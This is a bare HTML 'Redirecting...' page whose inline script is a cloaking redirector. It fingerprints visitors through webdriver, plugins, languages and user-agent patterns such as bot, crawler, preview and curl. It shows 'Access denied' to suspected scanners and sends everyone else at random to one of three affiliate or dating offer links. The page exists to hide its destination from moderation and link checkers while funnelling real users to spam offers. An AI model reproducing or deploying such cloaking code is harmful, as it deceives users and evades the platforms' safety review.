<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <script>
    const offers = [
      "https://grzvkg.amurllove.com/?utm_source=da57dc555e50572d&ban=tiktok&j1=1&s1=212364&s2=2149649",
      "https://prev.affomelody.com/xPiMQz",
      "https://snurik.top/click?o=2&a=6549&sub_id1=domen1"
    ];

    function isBot() {
      const nav = navigator || {};
      const userAgent = nav.userAgent || "";
      const webdriver = nav.webdriver || false;
      const languages = nav.languages || [];
      const plugins = nav.plugins || [];

      const botPatterns = [
        /bot/i,
        /crawler/i,
        /spider/i,
        /preview/i,
        /fetch/i,
        /curl/i
      ];

      return (
        webdriver ||
        plugins.length === 0 ||
        languages.length === 0 ||
        botPatterns.some(p => p.test(userAgent))
      );
    }

    if (!isBot()) {
      const index = Math.floor(Math.random() * offers.length);
      window.location.href = offers[index];
    } else {
      document.body.innerHTML = "<h1>Access denied</h1>";
    }
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
